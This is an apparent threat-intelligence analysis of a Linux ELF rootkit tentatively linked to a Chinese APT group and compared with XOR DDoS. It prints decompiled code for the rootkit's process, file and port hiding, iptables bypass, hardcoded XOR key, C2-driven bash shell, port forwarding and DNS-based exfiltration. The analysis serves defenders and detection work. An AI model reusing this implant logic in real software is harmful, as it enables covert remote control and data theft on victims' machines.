## Rootkit 101
### Initital approach

<h4>Thanks to <a href="https://twitter.com/KorbenD_Intel">KorbenD</a> for sharing the sample recently detected by Thor (<a href="https://www.virustotal.com/gui/file/cc1455e3a479602581c1c7dc86a0e02605a3c14916b86817960397d5a2f41c31/details">here</a>).</h4>
<h4>The ELF rootkit begins to initiate for hiding the process to user. This begins to get the system informations by recon actions (computername, user, mac, interfaces informations...) and begin as daemon for running in the background. This performs several hide ways for hiding the activity to user and also bypass the iptables for launch the main thread and UDP subthread (DNS exfiltration). If the attribute of the elf isn't good, this modify theirs attributes of the owner by lchown call.</h4>

```cpp
undefined8 main(undefined8 argc, char **argv)
{
 undefined8 *puVar1;
 uint16_t uVar2;
 uint32_t uVar3;
 undefined8 uVar4;
 char **s;
 undefined8 var_24h;
 int32_t var_18h;
 int64_t var_14h;
 
 var_24h._0_4_ = (int32_t)argc;
 if ((int32_t)argc < 2) {
  var_14h._0_4_ = 0;
  while ((int32_t)var_14h < (int32_t)var_24h) {
   uVar4 = strlen(argv[(int32_t)var_14h]);
   memset(argv[(int32_t)var_14h], 0, uVar4);
   var_14h._0_4_ = (int32_t)var_14h + 1;
  }
  puVar1 = (undefined8 *)*argv;
  *puVar1 = 0x68655f697363735b;
  *(undefined2 *)(puVar1 + 1) = 0x5d;
  get_mac((char *)MAGIC);
  daemon(1);
  init_crc_table();
  uVar3 = getpid();
  HidePidPort(1, (uint64_t)uVar3);
  var_18h = 0;
  while (var_18h < 3) {
   HidePidPort(3, (uint64_t)*(uint32_t *)(DecRemotePort + (int64_t)var_18h * 4));
   var_18h = var_18h + 1;
  }
  HidePidPort(3, 0x1776);
  HidePidPort(7, 0x1776);
  uVar3 = inet_addr(_DNS_ADDR);
  bypass_iptables(0xd, (uint64_t)uVar3);
  uVar2 = htons(0x1776);
  bypass_iptables(0xe, (uint64_t)uVar2);
  uVar2 = htons(0x1776);
  bypass_iptables(0xf, (uint64_t)uVar2);
  pthread_create((int64_t)&var_24h + 4, 0, MainThread, 0);
  pthread_create((int64_t)&var_24h + 4, 0, UdpThread, 0);
  pause();
 } else {
  if ((int32_t)argc == 2) {
   lchown(argv[1], 0x95b62d85, 0xf100cbff);
  }
 }
 return 0;
}
```

<h4>We can easily see on the graphs of calls performed by the main function.</h4>
 <p align="center"><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/China/APT/APT27/2020-11-17/Pictures/callgraph_main.png"></img></p>

<h4>As explained previously, this check for getting the mac of the interface in checking if that's in IPv4 or IPv6, this use sprintf for parsing to the format of the MAC address.</h4>

```cpp
s1._0_4_ = 0;
fildes = socket(2, 1, 0);
if (fildes != 0xffffffff) {
  var_60h._0_4_ = 0x500;
  var_58h = (int64_t)&var_560h;
  iVar1 = ioctl(fildes, 0x8912, &var_60h);
  if (-1 < iVar1) {
  var_3ch = (int32_t)((uint64_t)(int64_t)(int32_t)var_60h / 0x28);
  while ((int32_t)s1 < var_3ch) {
 iVar1 = strncmp(&var_560h + (int64_t)(int32_t)s1 * 5, 0x408380, 2);
 if (((iVar1 != 0) &&
  (iVar1 = ioctl(fildes, 0x8927, &var_560h + (int64_t)(int32_t)s1 * 5, &var_560h), -1 < iVar1)) && 
 ((acStack1366[(int64_t)(int32_t)s1 * 0x28] != '\0' ||
 ((((acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1] != '\0' ||
 (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2] != '\0')) ||
 (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3] != '\0')) ||
 ((acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4] != '\0' ||
 (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5] != '\0')))))))) {
  sprintf(arg1, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", 
 acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
 acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5]);
  close(fildes);  // close access to socket
  return 0;
 }
 s1._0_4_ = (int32_t)s1 + 1;
   }
  }
  close(fildes);  // close access to socket
   }
 // if IPv6
 stream = fopen64("/proc/net/if_inet6", 0x4083c9);
 if (stream != 0) {
  iVar2 = fgets(&s2, 0x7ff, stream); // close access to stream
  if (((iVar2 != 0) && (iVar2 = fgets(&s2, 0x7ff, stream), iVar2 != 0)) && (uVar3 = strlen(&s2), 0x1f < uVar3)) {
   memcpy(arg1, &s2, 0x20, &s2);
   arg1[0x20] = '\0';
   fclose(stream); // close access to stream
   return 0;
  }
  fclose(stream); // close access to stream
 }
 return 0xffffffff;
```

<h4>This continues for getting all the IP from all the interfaces, the current IP and the hostname.</h4>

```cpp
// Get all the IP of the interfaces
var_10h = (char *)0x4084e1;
memset(arg1, 0, (int64_t)(int32_t)arg2);
fildes = socket(2, 2, 0);
if ((int32_t)fildes < 0) {var_8h._0_4_ = 0;} 
else {
  var_2b0h._0_4_ = 0x280;
  var_2a8h = (int64_t)&var_2a0h;
  iVar1 = ioctl(fildes, 0x8912, &var_2b0h);
  if (iVar1 == 0) {
   close(fildes);
   var_18h = (int32_t)((uint64_t)(int64_t)(int32_t)var_2b0h / 0x28);
   var_8h._0_4_ = 0;
   var_8h._4_4_ = 0;
   while (var_8h._4_4_ < var_18h) {
 s2 = (char *)inet_ntoa(auStack660[(int64_t)var_8h._4_4_ * 10]);
 iVar1 = strcmp(s2, "127.0.0.1");
 if (iVar1 != 0) {
  strcat(arg1, s2, s2);
  strcat(arg1, var_10h, var_10h);
  var_8h._0_4_ = (int32_t)var_8h + 1;
 }
 var_8h._4_4_ = var_8h._4_4_ + 1;
   }
  } else {
   close(fildes);
   var_8h._0_4_ = 0;
  }
 }
return (int32_t)var_8h;


// Resolve for the IP and the hostname
var_4h = 0;
var_20h = 0;
var_18h = 0;
if (CONCAT44(in_RDI, arg1) == 0) {var_4h = 0;} 
else {
  iVar1 = is_ip(arg1);
  if (iVar1 < 1) {
   iVar1 = resolve(arg1, (int64_t)&var_20h);
   if (iVar1 != 0) {var_4h = inet_addr(&var_20h);}
  } else {
   iVar2 = gethostbyname(CONCAT44(in_RDI, arg1));
   if (iVar2 == 0) {var_4h = 0;} 
   else {
 var_4h = ***(uint32_t ***)(iVar2 + 0x18);
 if (var_4h == 0) {var_4h = 0;}
   }
  }
 }
return var_4h;
```

<h4>This bypasses the iptables restrictions in using a hook in using a virtual device and iocti syscall for pushing the data to send.</h4>

```cpp
undefined4 bypass_iptables(int64_t arg1, int64_t arg2)
{
 int64_t var_34h;
 int64_t var_20h;
 int64_t var_18h;
 uint32_t fildes;
 int64_t var_4h;
 
 var_34h._0_4_ = (undefined4)arg1;
 var_34h._4_4_ = (undefined4)arg2;
 var_4h._0_4_ = 0xffffffff;
 fildes = 0xffffffff;
 fildes = open64("/proc/rs_dev", 0x800); // Pass a virtual device by hook syscall
 if (fildes != 0xffffffff) {
  var_20h._0_2_ = (undefined2)(undefined4)var_34h;
  var_18h = (int64_t)&var_34h + 4;
  var_4h._0_4_ = ioctl(fildes, 0x46375829, &var_20h); // use system call ioctl for push the data
  close(fildes);
 }
 return (undefined4)var_4h;
}

```

<h4>This encrypts and decrypts the data received or send to the C2 in using a string and the number of the increments pushed in argument of the function (fixed by exchange between implant and C2).</h4>

```cpp
void * encrypt_code(void *arg1, undefined8 arg2, undefined8 arg3)
{
 void *var_18h;
 int64_t var_10h;
 int64_t var_8h;
 
 var_10h._4_4_ = 0;
 var_8h = (int64_t)arg1;
 while (var_10h._4_4_ < (int32_t)arg2) {
  *(uint8_t *)var_8h = *(uint8_t *)var_8h ^ "CB2FA36AAA9541F0Unknown"[var_10h._4_4_ % 0x10];
  var_10h._4_4_ = var_10h._4_4_ + 1;
  var_8h = var_8h + 1;
 }
 return arg1;
}
```

<h4>This can initiate a port forwarding, in creating a new socket for initiating the endpoint instance between the two sockets and establish the port fordwarding.</h4>

```cpp

 pthread_self();
 pthread_detach();
 fildes._0_4_ = 0xffffffff;
 exceptfds = 0xffffffff;
 exceptfds = createsocket((uint64_t)(*(uint32_t *)((int64_t)arg1 + 0xc) & 0xffff));
 if (exceptfds == -1) {
 // WARNING: Load size is inaccurate
  if (0 < *arg1) {
   bzero(&s, 0x18);
   var_34h._0_4_ = 6;
   var_38h = *(undefined4 *)((int64_t)arg1 + 0x18);
   s._0_4_ = CalcHeaderCrc();
   encrypt_code(&s, 0x18, arg3);
 // WARNING: Load size is inaccurate
   safesend((uint64_t)*arg1, &s, 0x18);
  }
 } else {
  if (*(int64_t *)((int64_t)arg1 + 0x10) != 0) { **(int32_t **)((int64_t)arg1 + 0x10) = exceptfds; }
  var_d4h._0_4_ = 0x10;
  do {
   while( true ) {
 iVar4 = 0x10;
 puVar5 = &readfds;
 while (iVar4 != 0) {
  iVar4 = iVar4 + -1;
  *puVar5 = 0;
  puVar5 = puVar5 + 1;
 }
 var_ch = 0;
 var_10h = (int32_t)puVar5;
 iVar2 = exceptfds;
 if (exceptfds < 0) { iVar2 = exceptfds + 0x3f; }
 uVar1 = (uint8_t)(exceptfds >> 0x37);
 (&readfds)[iVar2 >> 6] = 1 << (((char)exceptfds + (uVar1 >> 2) & 0x3f) - (uVar1 >> 2) & 0x3f) | (&readfds)[iVar2 >> 6];
 stack0xffffffffffffff28 = 1;
 var_c8h = 0;
 var_14h = select(exceptfds + 1, &readfds, 0, 0, (int64_t)&var_d4h + 4);
 uVar6 = (undefined4)((uint64_t)in_stack_fffffffffffffed8 >> 0x20);
 if (var_14h < 0) break;
 if ((var_14h != 0) && (0 < var_14h)) {
  fildes._0_4_ = accept(exceptfds, &var_f0h, &var_d4h, &var_f0h);
  if ((uint32_t)fildes == 0xffffffff) goto code_r0x00405084;
  in_stack_fffffffffffffed8 = CONCAT44(uVar6, 10);
  iVar2 = set_sock_keep_alive((uint32_t)fildes, (void *)0x1, (void *)0x5, (void *)0x5, (void *)0x5, 10, in_stack_fffffffffffffed8);
  if ((iVar2 == -1) || (var_20h = (void *)malloc(0xc), (undefined4 *)var_20h == (undefined4 *)0x0))
  goto code_r0x00405084;
  *(uint32_t *)((int64_t)var_20h + 8) = (uint32_t)fildes;
  *(undefined4 *)var_20h = *(undefined4 *)((int64_t)arg1 + 4);
  *(undefined4 *)((int64_t)var_20h + 4) = *(undefined4 *)((int64_t)arg1 + 8);
  pthread_create(&var_f8h, 0, Loop, var_20h);
 }
   }
   piVar3 = (int32_t *)__errno_location();
  } while (*piVar3 == 4);
 }
code_r0x00405084:
 close((uint32_t)fildes);
 close(exceptfds);
 free(arg1);
 return;
```

<h4>The rootkit can also execute command by shell instance and modify settings on the system. The first idea with a port forwarding for a red team rest to use it with a modification of the iptables for forward the data node to node as pivoting measure on the infrastructure. This rest doesn't exclude that the group use this process for the pivoting in the infrastructure not even a function is specifically implemented in the rootkit.</h4>

<h4>This initiates the bash instance, this begins to open the address of the tty console by ptmx_open for check if this can use it after making a fork for separate process group leader anymore and hence setting the sid and pgid of the new session to actual pid in calling execve for launch the bash instance (avoid throwing EPERM by the kernel due process groups cannot move between sessions).</h4>

```cpp
 var_44h._0_4_ = (uint32_t)arg1;
 fd = 0xffffffff;
 var_10h = 0xffffffff;
 pid._0_4_ = -1;
 fildes = 0;
 fd = ptmx_open((char *)&var_30h);
 if (fd != 0xffffffff) {
  var_44h._6_2_ = (undefined2)arg_20h;
  var_44h._4_2_ = (undefined2)((uint64_t)arg_20h >> 0x20);
  ioctl(fd, 0x5414, (int64_t)&var_44h + 4);
  pid._0_4_ = fork();
  if ((int32_t)pid == 0) {
   fildes = 3;
   while (fildes < 0x400) {
 close(fildes);
 fildes = fildes + 1;
   }
   iVar1 = setsid();
   if (-1 < iVar1) {
 var_10h = open64(&var_30h, 2);
 if (var_10h != 0xffffffff) {
  dup2(var_10h, 0);
  dup2(var_10h, 1);
  dup2(var_10h, 2);
  close(var_10h);
  chdir(0x4084d5);
  execve("/bin/bash", earg, envp);
 }
   }
   exit(0);
  }
  if (0 < (int32_t)pid) {
   uVar2 = CalcHeaderCrc();
   arg_10h._0_4_ = uVar2;
   encrypt_code(&arg_10h, 0x18, arg3);
   iVar1 = safesend((uint64_t)(uint32_t)var_44h, &arg_10h, 0x18);
   if (iVar1 != 0) {
 LoopData((uint64_t)fd, (uint64_t)(uint32_t)var_44h);
 kill((int32_t)pid, 9);
 wait(wstatus);
   }
  }
 }
 close(fd);
 return (int32_t)pid;
```

<h4>The "hide" function uses a switch condition for redirect to the needed functions to perform for hiding PID, port, files or the attributes for change ownership of designed files by lchown call. We can note that a lot of case conditions are empty on the results, that for making more harder the analysis and AV detection ?</h4>

```cpp
 var_1014h._0_4_ = (uint32_t)arg1;
 var_4h._0_4_ = 0xffffffff;
 if (arg_10h._4_4_ != 0) {
  if (0xfff < arg_10h._4_4_) goto code_r0x00403566;
  iVar1 = saferecv(arg1 & 0xffffffff, (int64_t)&var_1014h + 4, (uint64_t)arg_10h._4_4_);
  if (iVar1 == 0) goto code_r0x00403566;
  encrypt_code((void *)((int64_t)&var_1014h + 4), (uint64_t)arg_10h._4_4_, (uint64_t)arg_10h._4_4_);
 }
 arg_20h._4_4_ = (uint32_t)((uint64_t)arg_20h >> 0x20);
 arg_10h._4_4_ = (uint32_t)((uint64_t)arg_10h >> 0x20);
 // switch table (21 cases) at 0x4081f8
 switch(arg_20h & 0xffffffff) {
 case 1:
 case 2:
 case 3:
 case 4:
 case 5:
 case 6:
 case 7:
 case 8:
 case 9:
 case 10:
  var_4h._0_4_ = HidePidPort(arg_20h & 0xffffffff, (uint64_t)arg_20h._4_4_);
  break;
 case 0xb:
 case 0xc:
  if (arg_10h._4_4_ != 0) {
   var_4h._0_4_ = HideFile(arg_20h & 0xffffffff, (char *)((int64_t)&var_1014h + 4));
  }
  break;
 case 0x13:
  if (arg_10h._4_4_ != 0) {
   var_4h._0_4_ = lchown((int64_t)&var_1014h + 4, 0x95b62d85, 0xf100cbff);
  }
  break;
 case 0x14:
  if (arg_10h._4_4_ != 0) {
   var_4h._0_4_ = lchown((int64_t)&var_1014h + 4, 0, 0);
  }
 }
code_r0x00403566:
 arg_20h._0_4_ = (undefined4)var_4h;
 uVar2 = CalcHeaderCrc();
 arg_10h._0_4_ = uVar2;
 encrypt_code(&arg_10h, 0x18, arg3);
 safesend((uint64_t)(uint32_t)var_1014h, &arg_10h, 0x18);
 return;
```

<h4>For hiding the process, this hook in opening the access to the list of the process and hide it by ioctl syscall.</h4>

```cpp
int64_t var_34h;
int64_t var_20h;
int64_t var_18h;
uint32_t fildes;
int64_t var_4h;   
var_34h._0_4_ = (undefined4)arg1;
var_34h._4_4_ = (undefined4)arg2;
var_4h._0_4_ = 0xffffffff;
fildes = 0xffffffff;
fildes = open64("/proc/rs_dev", 0x800);
if (fildes != 0xffffffff) {
  var_20h._0_2_ = (undefined2)(undefined4)var_34h;
  var_18h = (int64_t)&var_34h + 4;
  var_4h._0_4_ = ioctl(fildes, 0x46375829, &var_20h);
  close(fildes);
}
return (undefined4)var_4h;
```

<h4>The same process is doing for hide the files in using the reference to the files in argument to search and hide it.</h4>

```cpp
var_34h._0_4_ = (undefined4)arg1;
var_4h._0_4_ = 0xffffffff;
fildes = 0xffffffff;
fildes = open64("/proc/rs_dev", 0x800);
if (fildes != 0xffffffff) {
  unique0x10000080 = (int64_t)arg2;
  var_28h._0_2_ = strlen(arg2);
  var_20h._0_2_ = (undefined2)(undefined4)var_34h;
  var_18h = (int64_t)&var_34h + 4;
  var_4h._0_4_ = ioctl(fildes, 0x46375829, &var_20h);
  close(fildes);
}
return (undefined4)var_4h;
```

<h4>The rootkit adds the DNS IP address for exfiltration and communications to the C2 (can also remove the address after updating the new IP of the DNS to contact). This can also manage PKG and clear all the DNS entries on the configuration.</h4>

```cpp
// add new DNS entry
iVar1 = 0x200;
 ppcVar2 = &s;
 while (iVar1 != 0) {
  iVar1 = iVar1 + -1;
  *ppcVar2 = (char *)0x0;
  ppcVar2 = ppcVar2 + 1;
 }
 var_2ch = 0;
 ptr = (void *)0x0;
 var_1ch = 0;
 var_38h = (void *)0x0;
 s1 = (char *)0x0;
 var_28h = (char *)0x0;
 var_8h = (int64_t)arg1;
 do {
  if (*(char *)var_8h == '\0') { return 0;}
  var_ch = 0;
  memset(&s, 0, 0x1000);
  while (((*(char *)var_8h != '\r' && (*(char *)var_8h != '\n')) && (*(char *)var_8h != '\0'))) {
   *(undefined *)((int64_t)&s + (int64_t)var_ch) = *(undefined *)var_8h;
   var_ch = var_ch + 1;
   var_8h = var_8h + 1;
  }
  if ((char)s != '\0') {
   var_1ch = 0;
   ptr = (void *)0x0;
   s1 = (char *)strchr(&s, 0x3a);
   if (s1 != (char *)0x0) {
    *s1 = '\0';
    var_38h = &s;
    s1 = s1 + 1;
    var_28h = (char *)strtok(s1);
 while (var_28h != (char *)0x0) {
  var_2ch = inet_addr(var_28h);
  if (var_2ch != 0xffffffff) {
   var_1ch = var_1ch + 1;
   ptr = (void *)realloc(ptr, (uint64_t)var_1ch * 4, (uint64_t)var_1ch * 4);
   if (ptr == (void *)0x0) {  return 0; }
   *(uint32_t *)((uint64_t)(var_1ch - 1) * 4 + (int64_t)ptr) = var_2ch;
  }
  var_28h = (char *)strtok(0);
 }
 if (ptr != (void *)0x0) {
  conf_DNS(0x10, (int64_t)var_38h, (int64_t)ptr, (uint64_t)(var_1ch & 0xffff), arg2 & 0xffff);
  free(ptr);
 }
   }
  }
  if (*(char *)var_8h != '\0') {
   var_8h = var_8h + 1;
  }
 } while( true );
```

<h4>Send the data by DNS queries to the DNS server.</h4>

```cpp
undefined4 sendudp(int64_t arg1, int64_t arg2, void *arg3, int64_t arg4)
{
 int32_t iVar1;
 int64_t var_38h;
 void *var_30h;
 int64_t var_24h;
 undefined4 var_1ch;
 undefined4 optname;
 uint32_t fildes;
 int64_t var_4h;
 
 var_24h._0_4_ = (undefined4)arg1;
 fildes = 0xffffffff;
 optname = 1;
 var_4h._0_4_ = 0xffffffff;
 fildes = socket(2, 2, 0);
 if (fildes != 0xffffffff) {
  var_24h._4_2_ = 2;
  var_24h._6_2_ = htons(arg2 & 0xffff);
  var_1ch = (undefined4)var_24h;
  iVar1 = setsockopt(fildes, 1, 6, &optname, 4);
  if (-1 < iVar1) {
   var_4h._0_4_ = sendto(fildes, arg3, arg4, 0, (int64_t)&var_24h + 4, 0x10);
  }
 }
 close(fildes);
 return (undefined4)var_4h;
}
```

<h4>This check the reply for getting the orders to perform on the machine.</h4>

```cpp
if (((int64_t)(&readfds)[(int32_t)uVar3 >> 6] >>  (((char)(uint32_t)socket + (uVar2 >> 2) & 0x3f) - (uVar2 >> 2) &  0x3f) & 1U) != 0) {
 length = recv_((uint64_t)(uint32_t)socket, (void *)((int64_t)&socket + 4), 0x1000);
 if (length < 1) {return 0 }
 var_14h = send_((uint64_t)(uint32_t)arg2, (char *)((int64_t)&socket + 4), (int64_t)length);
 if (var_14h != length) { return 0; }
}
```

<h4>This can also receive the data for writing a file on the machine.</h4>

```cpp
var_4h = 0;
 socket._0_4_ = (uint32_t)arg1;
 do {
  do {
   do {
    while( true ) {
     iVar5 = 0x10;
     puVar6 = &readfds;
     while (iVar5 != 0) {
      iVar5 = iVar5 + -1;
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
     }
     var_8h = 0;
     var_ch = (int32_t)puVar6;
     uVar3 = (uint32_t)socket;
     if ((int32_t)(uint32_t)socket < 0) {  uVar3 = (uint32_t)socket + 0x3f; }
     uVar1 = (uint8_t)((int32_t)(uint32_t)socket >> 0x37);
     (&readfds)[(int32_t)uVar3 >> 6] = 1 << (((char)(uint32_t)socket + (uVar1 >> 2) & 0x3f) - (uVar1 >> 2) & 0x3f) | (&readfds)[(int32_t)uVar3 >> 6];
     uVar3 = (uint32_t)arg2;
     if ((int32_t)(uint32_t)arg2 < 0) { uVar3 = (uint32_t)arg2 + 0x3f;}
     uVar1 = (uint8_t)((int32_t)(uint32_t)arg2 >> 0x37);
     (&readfds)[(int32_t)uVar3 >> 6] = 1 << (((char)(uint32_t)arg2 + (uVar1 >> 2) & 0x3f) - (uVar1 >> 2) & 0x3f) | (&readfds)[(int32_t)uVar3 >> 6];
     writefds = 1;
     var_a8h = 0;
     uVar3 = (uint32_t)arg2;
     if ((int32_t)(uint32_t)arg2 < (int32_t)(uint32_t)socket) { uVar3 = (uint32_t)socket;  }
     var_4h = select(uVar3 + 1, &readfds, 0, 0, &writefds);
     if (-1 < (int32_t)var_4h) break;
     piVar4 = (int32_t *)__errno_location();
     if (*piVar4 != 4) { return 0xffffffff; }
    }
   } while (var_4h == 0);
   uVar3 = (uint32_t)socket;
   if ((int32_t)(uint32_t)socket < 0) {
    uVar3 = (uint32_t)socket + 0x3f;
   }
   uVar2 = (uint8_t)((int32_t)(uint32_t)socket >> 0x37);
   if (((int64_t)(&readfds)[(int32_t)uVar3 >> 6] >>
     (((char)(uint32_t)socket + (uVar2 >> 2) & 0x3f) - (uVar2 >> 2) & 0x3f) & 1U) != 0) {
    length = recv_((uint64_t)(uint32_t)socket, (void *)((int64_t)&socket + 4), 0x1000);
    if (length < 1) {  return 0; }
    var_14h = send_((uint64_t)(uint32_t)arg2, (char *)((int64_t)&socket + 4), (int64_t)length);
    if (var_14h != length) { return 0; }
   }
   uVar3 = (uint32_t)arg2;
   if ((int32_t)(uint32_t)arg2 < 0) { uVar3 = (uint32_t)arg2 + 0x3f; }
  } while (((int64_t)(&readfds)[(int32_t)uVar3 >> 6] >> (((char)(uint32_t)arg2 + (uVar1 >> 2) & 0x3f) - (uVar1 >> 2) & 0x3f) & 1U) == 0);
  length = recv_((uint64_t)(uint32_t)arg2, (void *)((int64_t)&socket + 4), 0x1000);
  if (length < 1) { return 0;  }
  var_14h = send_((uint64_t)(uint32_t)socket, (char *)((int64_t)&socket + 4), (int64_t)length);
 } while (var_14h == length);
 return 0;
```
<h4>Once the data extract to the response of the DNS queries, that check by switch condition the code for initiating the commands to perform.</h4>

```cpp
switch((undefined4)var_34h) {
case 1: // 0x1 -> New thread for a console
 pthread_create(&var_1d8h, 0, PtyThread, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 2: // 0x2 -> New thread for change attributes of files
 pthread_create(&var_1d8h, 0, FileThread, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 5: // 0x5 -> New thread for mapping network
pthread_create(&var_1d8h, 0, PortMapThread, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 6: // 0x6 -> New thread for the port forwarding
 pthread_create(&var_1d8h, 0, PortforwardThread, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 7: // 0x7 -> New thread for hiding methods
 pthread_create(&var_1d8h, 0, HideThread, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 8: // 0x8 -> New thread for reading the configuration
 pthread_create(&var_1d8h, 0, ReadReConnConf, &var_2f0h, in_R8, in_R9, uVar3, uVar5, uVar6);
 break;
case 0xb: // 0xb -> Add to the DNS entry
 if (var_40h._4_4_ != 0) {
   ptr = (void *)malloc(var_40h._4_4_);
   if (ptr == (void *)0x0) goto code_r0x00403c59;
   memset(ptr, 0, var_40h._4_4_);
   iVar1 = saferecv((uint64_t)(uint32_t)fildes, (int64_t)ptr, (uint64_t)var_40h._4_4_);
   if (iVar1 == 0) goto code_r0x00403c59;
   encrypt_code(ptr, (uint64_t)var_40h._4_4_, (uint64_t)var_40h._4_4_);
   AddDNS(ptr, (uint64_t)(var_34h._4_4_ & 0xffff));
   free();
  }
  break;
case 0xc: // 0xc -> Remove to the DNS entry
 if (var_40h._4_4_ != 0) {
   ptr = (void *)malloc(var_40h._4_4_);
   if (ptr == (void *)0x0) goto code_r0x00403c59;
   memset(ptr, 0, var_40h._4_4_);
   iVar1 = saferecv((uint64_t)(uint32_t)fildes, (int64_t)ptr, (uint64_t)var_40h._4_4_);
   if (iVar1 == 0) goto code_r0x00403c59;
   encrypt_code(ptr, (uint64_t)var_40h._4_4_, (uint64_t)var_40h._4_4_);
   DelDNS((int64_t)ptr);
   free();
  }
 break;
 case 0xd: // 0xd -> Flush all the DNS configuration
  conf_DelAll_DNS();
 }
```

<h4>I check by Yara rule, this uses the same string for as multiple increments as XOR key since 2018.</h4>
 <p align="center"><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/China/APT/APT27/2020-11-17/Pictures/Encrypt.png"></img></p>

<h4>The method for hooking the files, process and bypass iptables are similiar to XOR DDoS in the rootkit feature and implementation of the structure. That isn't excludes that can be reversed or the code source have been intercepted and modified by China APT operators. </h4>
 <p align="center"><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/China/APT/APT27/2020-11-17/Pictures/slide.PNG"></img></p>
<h4>The rest matches with some parts of the blackberry analysis about bronzeunion group but without the samples, hard to confirm it.</h4>
<br/>
<h4>About XOR DDoS, another Linux botnet malware focus Docker containers and IOT and called Kaiji are used on a side operation by another Threat Actor (TA) reported by Trend Micro. I thinking to be in link to this at the beginning but finally different, this show that a leak of the source code maybe have been intercepted and reused.</h4>

### References

<ul>
<li><a href="https://grehack.fr/data/2017/slides/GreHack17_Down_The_Rabbit_Hole:_How_Hackers_Exploit_Weak_SSH_Credentials_To_Build_DDoS_Botnets.pdf/">Down The Rabbit Hole: How Hackers Exploit Weak SSH Credentials To Build DDoS Botnets</a></li>
<li><a href="https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html">XORDDoS, Kaiji Variants Target Exposed Docker Servers</a></li>
</ul>
